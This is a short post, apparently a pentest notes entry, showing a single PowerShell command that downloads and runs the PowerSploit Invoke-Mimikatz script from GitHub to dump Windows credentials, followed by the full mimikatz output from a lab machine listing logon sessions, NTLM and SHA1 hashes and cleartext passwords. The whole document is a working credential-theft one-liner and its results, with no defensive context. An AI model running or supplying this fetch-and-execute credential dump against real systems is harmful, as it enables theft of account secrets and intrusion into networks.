**Authors**: < [nixawk](https://github.com/nixawk) >

----

```
C:\Windows\system32>powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Dec 14 2015 18:03:07)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 17 modules * * */


mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 446842 (00000000:0006d17a)
Session           : Interactive from 1
User Name         : test
Domain            : lab
Logon Server      : LAB
Logon Time        : 10/14/2016 6:38:14 AM
SID               : S-1-5-21-2035202921-1308571849-2301429434-1000
        msv :
         [00000003] Primary
         * Username : test
         * Domain   : lab
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : e8f97fba9104d1ea5047948e6dfb67facd9f5b73
         [00010000] CredentialKeys
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : e8f97fba9104d1ea5047948e6dfb67facd9f5b73
        tspkg :
         * Username : test
         * Domain   : lab
         * Password : password
        wdigest :
         * Username : test
         * Domain   : lab
         * Password : password
        kerberos :
         * Username : test
         * Domain   : lab
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 446819 (00000000:0006d163)
Session           : Interactive from 1
User Name         : test
Domain            : lab
Logon Server      : LAB
Logon Time        : 10/14/2016 6:38:14 AM
SID               : S-1-5-21-2035202921-1308571849-2301429434-1000
        msv :
         [00010000] CredentialKeys
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : e8f97fba9104d1ea5047948e6dfb67facd9f5b73
         [00000003] Primary
         * Username : test
         * Domain   : lab
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : e8f97fba9104d1ea5047948e6dfb67facd9f5b73
        tspkg :
         * Username : test
         * Domain   : lab
         * Password : password
        wdigest :
         * Username : test
         * Domain   : lab
         * Password : password
        kerberos :
         * Username : test
         * Domain   : lab
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/14/2016 6:37:59 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : LAB$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 10/14/2016 6:37:59 AM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : LAB$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : lab$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 54335 (00000000:0000d43f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/14/2016 6:37:58 AM
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : LAB$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 10/14/2016 6:37:58 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : LAB$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : lab$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!
```
